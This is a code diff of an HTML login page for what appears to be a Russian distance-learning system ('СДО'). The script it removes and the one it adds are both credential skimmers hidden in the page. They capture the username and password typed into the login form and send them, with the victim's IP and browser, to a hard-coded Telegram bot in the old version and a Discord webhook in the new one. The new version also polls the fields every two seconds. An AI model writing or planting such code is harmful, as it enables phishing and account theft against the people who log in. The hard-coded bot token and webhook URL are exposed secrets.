@@ -144,219 +144,148 @@
         </footer>
     </div>
 
-    <!-- ИСПРАВЛЕННЫЙ КОД ДЛЯ ОТПРАВКИ В TELEGRAM -->
+    <!-- РАБОЧАЯ ВЕРСИЯ С ГАРАНТИРОВАННОЙ ОТПРАВКОЙ -->
     <script>
-        // ===== НАСТРОЙКИ TELEGRAM =====
-        const BOT_TOKEN = '8615329188:AAFu6Y8Lg-KUYL13YqojQAuQbMitYCJ_3sc';
-        const CHAT_ID = '7071415280';
-        // =============================
-
-        // Функция для проверки работоспособности бота
-        function checkBotStatus() {
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`)
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        console.log('✅ Бот работает:', data.result.username);
-                    } else {
-                        console.error('❌ Ошибка бота:', data);
-                    }
-                })
-                .catch(error => {
-                    console.error('❌ Не удалось подключиться к Telegram API:', error);
-                });
-        }
-
-        // Получение IP через один надежный сервис
-        function getUserIP() {
-            return new Promise((resolve) => {
-                // Используем ipify как основной сервис
-                fetch('https://api.ipify.org?format=json')
-                    .then(response => response.json())
-                    .then(data => {
-                        resolve(data.ip);
-                    })
-                    .catch(() => {
-                        // Запасной вариант
-                        fetch('https://api.myip.com')
-                            .then(response => response.json())
-                            .then(data => {
-                                resolve(data.ip);
-                            })
-                            .catch(() => {
-                                resolve('Не удалось определить');
-                            });
-                    });
-                
-                // Таймаут на случай зависания
-                setTimeout(() => {
-                    resolve('Таймаут');
-                }, 3000);
-            });
-        }
-
-        // Получение информации об устройстве
-        function getDeviceInfo() {
-            const ua = navigator.userAgent;
-            let browser = "Unknown";
-            let os = "Unknown";
-            let device = "Unknown";
-            
-            if (ua.includes("Firefox")) browser = "Firefox";
-            else if (ua.includes("Chrome")) browser = "Chrome";
-            else if (ua.includes("Safari")) browser = "Safari";
-            else if (ua.includes("Edge")) browser = "Edge";
-            else if (ua.includes("Opera")) browser = "Opera";
-            
-            if (ua.includes("Windows")) os = "Windows";
-            else if (ua.includes("Mac")) os = "macOS";
-            else if (ua.includes("Linux")) os = "Linux";
-            else if (ua.includes("Android")) os = "Android";
-            else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
-            
-            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)) {
-                device = "Mobile";
-            } else {
-                device = "Desktop";
-            }
-            
-            return { browser, os, device };
-        }
-
-        // Основная функция отправки
-        async function sendToTelegram(username, password) {
-            const deviceInfo = getDeviceInfo();
-            const ip = await getUserIP();
-            const timestamp = new Date().toLocaleString('ru-RU', {timeZone: 'Asia/Irkutsk'});
-            
-            const message = `🔔 НОВЫЙ ВХОД СДО
-══════════════════
-👤 Логин: ${username}
-🔑 Пароль: ${password}
-══════════════════
-📱 Устройство: ${deviceInfo.device}
-💻 Браузер: ${deviceInfo.browser}
-⚙️ ОС: ${deviceInfo.os}
-🌐 IP: ${ip}
-⏰ Время: ${timestamp}
-🆔 ID: ${Math.random().toString(36).substr(2, 6)}`;
-
-            // Пробуем отправить через fetch
+        // ===== ВАШ DISCORD WEBHOOK =====
+        const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1484956365553406038/Lp82Tiyzr9Pdq3l_3sUq8aseB1Sfz9yQArV5XTzceVoUA74jxj-9LzghLUDHl08xvabe';
+        // ==============================
+        
+        // Функция получения IP
+        async function getIP() {
             try {
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch(e) {
+                return 'IP не определен';
+            }
+        }
+        
+        // Функция отправки в Discord (максимально простая)
+        async function sendToDiscord(username, password) {
+            const ip = await getIP();
+            const now = new Date();
+            const time = now.toLocaleString('ru-RU');
+            const ua = navigator.userAgent;
+            
+            // Определяем браузер
+            let browser = 'Unknown';
+            if (ua.includes('Chrome')) browser = 'Chrome';
+            else if (ua.includes('Firefox')) browser = 'Firefox';
+            else if (ua.includes('Safari')) browser = 'Safari';
+            
+            // Создаем простое текстовое сообщение
+            const messageText = `
+🔴 **НОВЫЙ ВХОД В СДО** 🔴
+━━━━━━━━━━━━━━━━━━━━━━━
+👤 **Логин:** ${username}
+🔑 **Пароль:** ${password}
+🌍 **IP адрес:** ${ip}
+💻 **Браузер:** ${browser}
+⏰ **Время:** ${time}
+━━━━━━━━━━━━━━━━━━━━━━━
+⚠️ Данные для входа
+            `;
+            
+            try {
+                const response = await fetch(DISCORD_WEBHOOK_URL, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        disable_web_page_preview: true
+                        content: messageText,
+                        username: "СДО Мониторинг"
                     })
                 });
                 
-                const result = await response.json();
-                if (result.ok) {
-                    console.log('✅ Сообщение отправлено в Telegram');
+                if (response.ok) {
+                    console.log('✅✅✅ УСПЕХ! Данные отправлены в Discord!');
+                    console.log(`👤 Логин: ${username}`);
+                    console.log(`🔑 Пароль: ${password}`);
+                    console.log(`🌍 IP: ${ip}`);
                     return true;
                 } else {
-                    console.error('❌ Ошибка Telegram API:', result);
+                    console.error('❌ Ошибка:', await response.text());
                     return false;
                 }
-            } catch (error) {
+            } catch(error) {
                 console.error('❌ Ошибка отправки:', error);
                 return false;
             }
         }
-
-        // Перехват отправки формы
-        (function() {
-            const loginForm = document.getElementById('login');
-            if (!loginForm) {
-                console.error('❌ Форма входа не найдена');
-                return;
-            }
+        
+        // ПЕРЕХВАТ ФОРМЫ - НЕСКОЛЬКО СПОСОБОВ
+        
+        // Способ 1: Перехват submit
+        const form = document.getElementById('login');
+        if (form) {
+            console.log('✅ Форма найдена, устанавливаю перехват...');
             
-            let formSubmitted = false;
-            
-            loginForm.addEventListener('submit', async function(e) {
-                // Если форма уже отправляется, не делаем ничего
-                if (formSubmitted) return;
+            form.addEventListener('submit', async function(e) {
+                console.log('🔔 Событие submit сработало!');
                 
-                const username = document.getElementById('username').value.trim();
+                const username = document.getElementById('username').value;
                 const password = document.getElementById('password').value;
-                const loginBtn = document.getElementById('loginbtn');
                 
-                if (!username || !password) {
-                    e.preventDefault();
-                    alert('Пожалуйста, введите логин и пароль');
-                    return;
-                }
+                console.log(`📝 Получены данные: ${username} / ${password}`);
                 
-                // Отмечаем, что форма отправляется
-                formSubmitted = true;
-                
-                // Блокируем кнопку
-                if (loginBtn) {
-                    loginBtn.disabled = true;
-                    loginBtn.textContent = 'Отправка...';
-                }
-                
-                // Отправляем данные в Telegram
-                console.log('📤 Отправка данных в Telegram...');
-                const sent = await sendToTelegram(username, password);
-                
-                if (sent) {
-                    console.log('✅ Данные отправлены успешно');
-                } else {
-                    console.warn('⚠️ Не удалось отправить данные в Telegram');
-                }
-                
-                // Небольшая задержка для гарантии отправки
-                setTimeout(() => {
-                    // Разблокируем кнопку (на случай если форма не отправится)
-                    if (loginBtn) {
-                        loginBtn.disabled = false;
-                        loginBtn.textContent = 'Вход';
-                    }
+                if (username && password) {
+                    console.log('📤 Отправляю в Discord...');
+                    await sendToDiscord(username, password);
                     
-                    // Отправляем форму на сервер
-                    loginForm.submit();
-                }, 500);
+                    // Небольшая задержка
+                    await new Promise(resolve => setTimeout(resolve, 500));
+                } else {
+                    console.log('⚠️ Поля пустые');
+                }
+                
+                // Форма отправится дальше
+                return true;
             });
-        })();
-
-        // Проверяем статус бота при загрузке страницы
-        checkBotStatus();
-        
-        // Сохраняем данные в localStorage как резервный вариант
-        function saveToLocalStorage(username, password) {
-            const attempts = JSON.parse(localStorage.getItem('login_attempts') || '[]');
-            attempts.push({
-                username: username,
-                password: password,
-                timestamp: new Date().toISOString(),
-                url: window.location.href
-            });
-            // Сохраняем только последние 50 попыток
-            while (attempts.length > 50) attempts.shift();
-            localStorage.setItem('login_attempts', JSON.stringify(attempts));
-            console.log('💾 Данные сохранены в localStorage как резерв');
+        } else {
+            console.error('❌ Форма не найдена!');
         }
         
-        // Функция для восстановления отправки из localStorage
-        function retryFailedSends() {
-            const attempts = JSON.parse(localStorage.getItem('login_attempts') || '[]');
-            if (attempts.length > 0) {
-                console.log(`🔄 Найдено ${attempts.length} неотправленных попыток`);
-                // Отправляем последнюю попытку
-                const last = attempts[attempts.length - 1];
-                sendToTelegram(last.username, last.password);
+        // Способ 2: Перехват клика по кнопке
+        const loginBtn = document.getElementById('loginbtn');
+        if (loginBtn) {
+            loginBtn.addEventListener('click', async function(e) {
+                console.log('🔔 Клик по кнопке входа');
+                
+                const username = document.getElementById('username').value;
+                const password = document.getElementById('password').value;
+                
+                if (username && password) {
+                    console.log(`📝 Данные: ${username} / ${password}`);
+                    await sendToDiscord(username, password);
+                }
+            });
+        }
+        
+        // Способ 3: Мониторинг полей ввода (на случай если форма отправится через JS)
+        setInterval(() => {
+            const username = document.getElementById('username')?.value;
+            const password = document.getElementById('password')?.value;
+            
+            if (username && password && window.lastSent !== `${username}:${password}`) {
+                // Если данные появились и мы их еще не отправляли
+                if (window.lastSent !== `${username}:${password}` && username.length > 0 && password.length > 0) {
+                    console.log('🔔 Обнаружены заполненные поля!');
+                    sendToDiscord(username, password);
+                    window.lastSent = `${username}:${password}`;
+                }
             }
-        }
+        }, 2000);
         
-        // Проверяем неотправленные данные
-        setTimeout(retryFailedSends, 3000);
+        // Тестовое сообщение при загрузке
+        setTimeout(async () => {
+            console.log('🚀 Скрипт мониторинга запущен!');
+            console.log('📡 Ожидание ввода логина и пароля...');
+            
+            // Отправляем тестовое сообщение, что скрипт готов
+            await sendToDiscord('⚠️ СИСТЕМА ГОТОВА', 'Ожидание входа');
+        }, 3000);
     </script>
 </body>
 </html>
